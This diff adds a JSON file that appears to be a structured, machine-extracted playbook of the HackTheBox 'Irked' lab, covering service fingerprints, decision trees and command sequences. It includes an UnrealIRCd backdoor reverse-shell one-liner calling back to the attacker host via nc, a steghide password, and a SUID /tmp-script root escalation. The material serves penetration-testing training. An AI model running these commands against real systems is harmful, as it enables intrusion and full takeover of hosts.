@@ -1,0 +1,850 @@
+{
+  "writeup_id": "Htb_Irked",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_irc_backdoor_steganography",
+    "primary_services": [
+      "irc",
+      "http",
+      "ssh",
+      "rpc"
+    ],
+    "port_signature": "22+80+111+6697+8067+65534",
+    "service_combination": "ssh+http+rpc+unrealirc",
+    "os_family": "linux",
+    "environment_type": "standalone_server",
+    "entry_vector": "unrealirc_backdoor",
+    "privilege_path": "service_account_to_root_via_suid",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "unrealirc_3.2.8.1_backdoor",
+      "steganography_password_hint",
+      "suid_binary_tmp_script",
+      "ab_command_injection"
+    ],
+    "environmental_clues": [
+      "irc_server_running",
+      "web_server_with_image",
+      "debian_linux_system",
+      "multiple_irc_ports"
+    ],
+    "similar_scenarios": [
+      "beep_htb_easy",
+      "legacy_htb_easy"
+    ],
+    "unique_aspects": [
+      "steganography_component",
+      "irc_backdoor_exploitation",
+      "tmp_script_privilege_escalation",
+      "image_password_extraction"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "UnrealIRCd_Backdoor_Exploitation",
+        "success_reason": "UnrealIRCd 3.2.8.1 contained a hardcoded backdoor triggered by 'AB;' prefix",
+        "prerequisite_indicators": [
+          "irc_service_running",
+          "unrealirc_version_3.2.8.1",
+          "backdoor_code_present"
+        ],
+        "recognition_patterns": [
+          "multiple IRC ports open (6697, 8067, 65534)",
+          "UnrealIRCd service banner",
+          "immediate command execution after 'AB;' payload"
+        ],
+        "failure_modes": [
+          "patched_unrealirc_version",
+          "backdoor_removed",
+          "irc_service_not_accessible"
+        ],
+        "environmental_factors": [
+          "vulnerable_software_version",
+          "unpatched_system",
+          "default_service_configuration"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "2-5 minutes"
+      },
+      {
+        "technique": "SUID_Binary_Exploitation",
+        "success_reason": "Custom SUID binary executed non-existent script from /tmp without validation",
+        "prerequisite_indicators": [
+          "suid_binary_present",
+          "script_path_writable",
+          "missing_target_script"
+        ],
+        "recognition_patterns": [
+          "custom SUID binaries in unusual locations",
+          "writable /tmp directory access",
+          "binary attempts to execute missing files"
+        ],
+        "failure_modes": [
+          "script_already_exists",
+          "tmp_not_writable",
+          "proper_path_validation"
+        ],
+        "environmental_factors": [
+          "custom_application_deployment",
+          "insufficient_security_review",
+          "writable_temp_directories"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "UnrealIRCd backdoor vulnerability",
+        "discovery_method": "nmap service enumeration + searchsploit research",
+        "why_critical": "Provided immediate remote code execution as ircd user",
+        "how_to_recognize": [
+          "UnrealIRCd version 3.2.8.1 in service banner",
+          "multiple IRC ports exposed",
+          "known CVE with public exploits"
+        ],
+        "follow_up_actions": [
+          "test_backdoor_with_ping",
+          "establish_reverse_shell",
+          "enumerate_local_system"
+        ]
+      },
+      {
+        "discovery": "Steganography hint and password",
+        "discovery_method": "file system enumeration and steganography extraction",
+        "why_critical": "Provided user account access credentials",
+        "how_to_recognize": [
+          "hidden files with cryptic names",
+          "references to steganography",
+          "image files on web server"
+        ],
+        "follow_up_actions": [
+          "extract_hidden_data_from_images",
+          "test_discovered_passwords",
+          "escalate_to_user_account"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "ircd_user",
+        "escalation_method": "steganography_password_discovery",
+        "why_possible": "Hidden password in system led to user account access",
+        "recognition_signs": [
+          "steganography_references_in_files",
+          "image_files_available",
+          "password_reuse_patterns"
+        ],
+        "exploitation_path": "Find steg hint → Extract from image → User access"
+      },
+      {
+        "privilege_level": "user_account",
+        "escalation_method": "suid_binary_script_injection",
+        "why_possible": "SUID binary executed controllable script from writable location",
+        "recognition_signs": [
+          "custom_suid_binaries",
+          "missing_script_dependencies",
+          "writable_temp_directories"
+        ],
+        "exploitation_path": "Find SUID binary → Identify missing script → Create malicious script → Root shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80,111,6697,8067,65534 open on Linux host",
+        "decision": "Investigate IRC ports first due to uncommon service",
+        "reasoning": "Multiple IRC ports (6697,8067,65534) indicate UnrealIRCd which has known vulnerabilities",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "web_enumeration",
+            "when": "if IRC fails"
+          },
+          {
+            "option": "rpc_enumeration",
+            "when": "if other services fail"
+          }
+        ],
+        "success_indicators": [
+          "irc_service_responds",
+          "service_version_identified",
+          "backdoor_command_accepted"
+        ],
+        "next_decision": "test_unrealirc_backdoor"
+      },
+      {
+        "step": 2,
+        "situation": "Confirmed UnrealIRCd service running",
+        "decision": "Test for backdoor command execution with AB; prefix",
+        "reasoning": "UnrealIRCd 3.2.8.1 has well-known backdoor accepting AB; commands",
+        "confidence": 0.95,
+        "prerequisites": [
+          "irc_connection_established"
+        ],
+        "success_indicators": [
+          "command_execution_confirmed",
+          "ping_response_received"
+        ],
+        "failure_fallbacks": [
+          "web_application_testing",
+          "ssh_bruteforce"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Got shell as ircd user, found user.txt but no read permission",
+        "decision": "Search for privilege escalation hints in accessible files",
+        "reasoning": "Low-privilege service account needs lateral movement to user account",
+        "confidence": 0.85,
+        "prerequisites": [
+          "shell_as_ircd_obtained"
+        ],
+        "success_indicators": [
+          "backup_file_found",
+          "steganography_hint_discovered"
+        ],
+        "next_decision": "investigate_steganography_clues"
+      },
+      {
+        "step": 4,
+        "situation": "Found .backup file with steg password hint",
+        "decision": "Extract steganography data from website image using found password",
+        "reasoning": "Backup file contains steg password, website has large image file",
+        "confidence": 0.9,
+        "prerequisites": [
+          "steg_password_found",
+          "website_image_identified"
+        ],
+        "success_indicators": [
+          "hidden_data_extracted",
+          "user_credentials_found"
+        ],
+        "next_decision": "authenticate_as_user"
+      }
+    ],
+    "branching_logic": {
+      "if_irc_backdoor_succeeds": {
+        "action": "establish_reverse_shell",
+        "tools": [
+          "nc",
+          "bash",
+          "mkfifo"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      },
+      "if_irc_backdoor_fails": {
+        "action": "enumerate_web_application",
+        "alternatives": [
+          "directory_bruteforce",
+          "source_code_analysis",
+          "rpc_enumeration"
+        ],
+        "decision_criteria": "based_on_service_responsiveness"
+      },
+      "if_steg_password_found": {
+        "action": "extract_hidden_data_from_images",
+        "tools": [
+          "steghide",
+          "stegcracker"
+        ],
+        "purpose": "find_user_credentials"
+      },
+      "if_user_credentials_obtained": {
+        "action": "lateral_movement_to_user_account",
+        "tools": [
+          "ssh",
+          "su"
+        ],
+        "next_phase": "root_privilege_escalation"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "prioritize_uncommon_services_first",
+        "reasoning": "IRC services less common and more likely to have exploitable vulnerabilities",
+        "applicability": "any_target_with_unusual_services"
+      },
+      {
+        "rule": "always_check_for_steganography_when_images_and_passwords_present",
+        "reasoning": "common_ctf_and_beginner_box_technique",
+        "applicability": "web_applications_with_images_and_password_hints"
+      },
+      {
+        "rule": "search_accessible_files_for_privilege_escalation_hints",
+        "reasoning": "service_accounts_often_have_limited_access_but_files_contain_clues",
+        "applicability": "low_privilege_shell_obtained"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "IRC_Backdoor_Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "irc"
+        ],
+        "required_ports": [
+          6667,
+          6697,
+          8067,
+          65534
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "unrealirc_service_running",
+          "vulnerable_version_3.2.8.1",
+          "network_connectivity_to_irc_ports"
+        ],
+        "success_indicators": [
+          "unrealirc_banner_detected",
+          "command_injection_successful",
+          "backdoor_payload_accepted"
+        ],
+        "incompatible_with": [
+          "patched_unrealirc_version",
+          "irc_service_disabled",
+          "strict_firewall_rules"
+        ],
+        "confidence_boosters": [
+          "multiple_irc_ports_open",
+          "default_unrealirc_configuration",
+          "no_authentication_required"
+        ],
+        "typical_success_rate": 0.95,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "SUID_Binary_Exploitation",
+        "mitre_id": "T1548.001",
+        "required_services": [],
+        "required_ports": [],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "suid_binary_present",
+          "writable_tmp_directory",
+          "missing_script_dependency"
+        ],
+        "success_indicators": [
+          "suid_binary_identified",
+          "script_path_writable",
+          "privilege_escalation_successful"
+        ],
+        "incompatible_with": [
+          "no_suid_binaries",
+          "restricted_tmp_access",
+          "proper_script_validation"
+        ],
+        "confidence_boosters": [
+          "custom_suid_binaries",
+          "tmp_directory_writable",
+          "missing_file_references"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Steganography_Password_Recovery",
+        "mitre_id": "T1552.001",
+        "required_services": [
+          "http"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_accessible",
+          "image_files_present",
+          "steganography_tools_available"
+        ],
+        "success_indicators": [
+          "hidden_data_extracted",
+          "password_recovered",
+          "credentials_validated"
+        ],
+        "incompatible_with": [
+          "no_image_files",
+          "encrypted_steganography",
+          "missing_extraction_tools"
+        ],
+        "confidence_boosters": [
+          "hint_about_steganography",
+          "suspicious_image_files",
+          "password_protected_content"
+        ],
+        "typical_success_rate": 0.6,
+        "estimated_time": "15-30 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "irc_service": {
+        "port_indicators": [
+          6667,
+          6697,
+          8067,
+          65534
+        ],
+        "service_indicators": [
+          "irc",
+          "ircs-u",
+          "infi-async"
+        ],
+        "banner_indicators": [
+          "UnrealIRCd",
+          "irked.htb"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "nginx",
+          "iis"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "linux_system": {
+        "port_indicators": [
+          22,
+          111
+        ],
+        "service_indicators": [
+          "ssh",
+          "rpcbind"
+        ],
+        "banner_indicators": [
+          "OpenSSH",
+          "Debian",
+          "Linux"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "irc_backdoor_exploitation",
+          "when": "unrealirc_detected",
+          "reason": "known_backdoor_high_success_rate"
+        },
+        {
+          "attack": "suid_binary_enumeration",
+          "when": "linux_system_access_gained",
+          "reason": "common_privilege_escalation_vector"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "steganography_analysis",
+          "when": "web_images_found_and_hints_present",
+          "reason": "potential_credential_recovery"
+        },
+        {
+          "attack": "web_directory_enumeration",
+          "when": "web_service_detected",
+          "reason": "may_reveal_additional_content"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "ssh_bruteforce",
+          "when": "ssh_service_detected",
+          "reason": "time_consuming_low_success_rate"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "UnrealIRCd Backdoor Command Execution",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "netcat",
+            "command_template": "nc {target_ip} {target_port}",
+            "actual_command": "nc 10.10.10.117 6697",
+            "output_pattern": ":irked.htb NOTICE AUTH",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "custom_python_exploit",
+            "command_template": "./unreal_3.2.8.1_exploit.py {target_ip} {target_port} {callback_ip} {callback_port}",
+            "actual_command": "./unreal_3.2.8.1_exploit.py 10.10.10.117 6697 10.10.14.14 443",
+            "success_factors": [
+              "vulnerable_version_3.2.8.1",
+              "backdoor_present"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "unrealirc_3.2.8.1_running",
+          "backdoor_version_installed",
+          "network_connectivity"
+        ],
+        "success_indicators": [
+          "shell_callback_received",
+          "command_execution_confirmed",
+          "ircd_user_access_gained"
+        ],
+        "common_failures": [
+          "non_vulnerable_version",
+          "network_filtering",
+          "service_not_running"
+        ],
+        "follow_up_techniques": [
+          "steganography_extraction",
+          "credential_discovery",
+          "privilege_escalation"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Steganography Data Extraction",
+        "mitre_id": "T1027.003",
+        "category": "defense_evasion",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "steghide",
+            "command_template": "steghide extract -sf {image_file} -p {password}",
+            "actual_command": "steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss",
+            "output_pattern": "wrote extracted data to",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "wget",
+            "command_template": "wget {target_url}/{image_file}",
+            "actual_command": "wget 10.10.10.117/irked.jpg",
+            "success_factors": [
+              "password_discovered",
+              "image_contains_hidden_data"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "steganography_password_found",
+          "target_image_identified",
+          "steghide_tool_available"
+        ],
+        "success_indicators": [
+          "hidden_file_extracted",
+          "credentials_revealed",
+          "authentication_successful"
+        ],
+        "common_failures": [
+          "incorrect_password",
+          "no_hidden_data",
+          "wrong_steganography_tool"
+        ],
+        "follow_up_techniques": [
+          "ssh_authentication",
+          "su_privilege_escalation",
+          "user_flag_retrieval"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "SUID Binary Exploitation",
+        "mitre_id": "T1548.001",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "find",
+            "command_template": "find / -perm -4000 -type f 2>/dev/null",
+            "actual_command": "find / -perm -4000 -type f 2>/dev/null",
+            "output_pattern": "-rwsr-xr-x",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          },
+          {
+            "name": "LinEnum.sh",
+            "command_template": "./LinEnum.sh -t",
+            "actual_command": "./LinEnum.sh -t",
+            "success_factors": [
+              "suid_binary_found",
+              "missing_script_dependency"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "user_level_access",
+          "suid_binary_present",
+          "exploitable_binary_behavior"
+        ],
+        "success_indicators": [
+          "suid_binaries_enumerated",
+          "vulnerable_binary_identified",
+          "root_shell_obtained"
+        ],
+        "common_failures": [
+          "no_suid_binaries",
+          "hardened_binaries",
+          "missing_dependencies"
+        ],
+        "follow_up_techniques": [
+          "root_flag_retrieval",
+          "persistence_establishment",
+          "system_enumeration"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "steghide",
+        "use_case": "extracting_hidden_data_from_images",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "steganography_challenges"
+        ],
+        "alternatives": [
+          "stegsolve",
+          "binwalk",
+          "strings"
+        ],
+        "best_practices": [
+          "try_common_passwords_first",
+          "check_image_metadata",
+          "verify_file_format_compatibility"
+        ]
+      },
+      {
+        "tool": "LinEnum.sh",
+        "use_case": "linux_privilege_escalation_enumeration",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "linux_privilege_escalation"
+        ],
+        "alternatives": [
+          "linpeas",
+          "linux-exploit-suggester",
+          "manual_enumeration"
+        ],
+        "best_practices": [
+          "run_with_thorough_flag",
+          "focus_on_suid_binaries",
+          "check_writable_directories"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "unrealirc_to_user_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "nc 10.10.10.117 6697",
+            "purpose": "Connect to IRC server",
+            "expected_output": "IRC server banner and auth notices"
+          },
+          {
+            "step": 2,
+            "command": "AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.14 443 >/tmp/f",
+            "purpose": "Execute backdoor command for reverse shell",
+            "expected_output": "Shell callback on listener"
+          },
+          {
+            "step": 3,
+            "command": "find /home -name '*.backup' 2>/dev/null",
+            "purpose": "Discover backup files with credentials",
+            "expected_output": "Steganography password found"
+          },
+          {
+            "step": 4,
+            "command": "wget 10.10.10.117/irked.jpg",
+            "purpose": "Download target image",
+            "expected_output": "Image file downloaded"
+          },
+          {
+            "step": 5,
+            "command": "steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss",
+            "purpose": "Extract hidden credentials",
+            "expected_output": "Password file extracted"
+          },
+          {
+            "step": 6,
+            "command": "su djmardov",
+            "purpose": "Escalate to user account",
+            "expected_output": "User shell access"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "15-25 minutes"
+      },
+      {
+        "sequence_name": "suid_privilege_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "find / -perm -4000 -type f 2>/dev/null",
+            "purpose": "Enumerate SUID binaries",
+            "expected_output": "List of SUID executables"
+          },
+          {
+            "step": 2,
+            "command": "./LinEnum.sh -t",
+            "purpose": "Comprehensive privilege escalation enumeration",
+            "expected_output": "Detailed system information including SUID files"
+          },
+          {
+            "step": 3,
+            "command": "strings /usr/bin/viewuser",
+            "purpose": "Analyze suspicious SUID binary",
+            "expected_output": "Binary dependencies and file paths"
+          },
+          {
+            "step": 4,
+            "command": "echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/listusers",
+            "purpose": "Create malicious script in expected location",
+            "expected_output": "Script created successfully"
+          },
+          {
+            "step": 5,
+            "command": "chmod +x /tmp/listusers",
+            "purpose": "Make script executable",
+            "expected_output": "Permissions set"
+          },
+          {
+            "step": 6,
+            "command": "/usr/bin/viewuser",
+            "purpose": "Execute SUID binary to trigger privilege escalation",
+            "expected_output": "Root shell obtained"
+          }
+        ],
+        "success_rate": 0.88,
+        "typical_duration": "10-15 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Irked",
+      "difficulty": "Easy",
+      "os": "Linux",
+      "platform": "HackTheBox",
+      "release_date": "2018-11-17",
+      "author": "MrAgent",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "irc_exploitation",
+        "steganography",
+        "suid_abuse"
+      ],
+      "key_vulnerabilities": [
+        "command_injection",
+        "weak_file_permissions",
+        "missing_script_execution"
+      ],
+      "environment_type": "linux_server_multi_service",
+      "real_world_relevance": "medium",
+      "learning_value": [
+        "irc_security",
+        "steganography_techniques",
+        "suid_privilege_escalation"
+      ],
+      "prerequisite_knowledge": [
+        "basic_linux",
+        "service_enumeration",
+        "steganography_basics"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_and_services",
+      "subcategories": [
+        "irc_exploitation",
+        "steganography",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "remote_code_execution",
+        "information_disclosure",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_irc_configuration",
+        "proper_file_permissions",
+        "suid_binary_auditing"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Beep",
+        "Shocker",
+        "Nibbles"
+      ],
+      "similarity_reasons": [
+        "service_exploitation",
+        "straightforward_attack_path",
+        "suid_escalation"
+      ],
+      "unique_aspects": [
+        "irc_server_exploitation",
+        "steganography_component",
+        "tmp_script_execution"
+      ],
+      "difficulty_factors": [
+        "minimal_enumeration_required",
+        "well_known_exploits",
+        "clear_escalation_path"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T01:04:55.998357",
+    "original_file": "0xdf_writeups/Htb Irked.md",
+    "content_length": 25829,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
